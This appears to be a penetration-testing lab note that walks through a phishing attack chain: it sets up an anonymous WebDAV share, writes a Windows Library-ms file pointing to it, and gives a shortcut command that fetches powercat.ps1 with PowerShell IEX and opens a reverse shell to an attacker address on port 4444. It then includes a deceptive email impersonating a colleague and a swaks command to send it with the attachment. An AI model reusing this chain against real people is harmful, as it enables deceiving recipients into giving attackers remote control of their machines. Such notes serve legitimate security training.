# Phishing

### Setting up WebDAV:

{% code overflow="wrap" %}
```sh
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```
{% endcode %}

* **--auth=anonymous:** disable authentication&#x20;
* **--root /home/kali/webdav/:** root of directory of webdav share

Save and close config.Library-ms in Visual Studio Code:

{% code title="config.Library-ms " overflow="wrap" %}
```visual-basic
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.2</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
{% endcode %}

* `<url>http://192.168.119.2</url>`: points to webdav share
* embedds connection to webdav share

### Create shortcut link

Right-click on the Desktop and select _New_ > _Shortcut_

{% code overflow="wrap" %}
```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1'); powercat -c 192.168.119.5 -p 4444 -e powershell"
```
{% endcode %}

Copy `.lnk` file to kali and add to the webdav share

### Send phishing email

{% code title="body.txt" overflow="wrap" %}
```
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.

On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!

John
```
{% endcode %}

{% code overflow="wrap" %}
```sh
sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
```
{% endcode %}

* **-t**: targets
* **--from**: sender&#x20;
* **--attach**: attachments
* **--suppress-data**: summarize information regarding the SMTP transactions
* **--header**: subject
* **--body**: email body, using contents of body.txt&#x20;
* **--server:** target IP address
* **-ap:** enable password authentication.

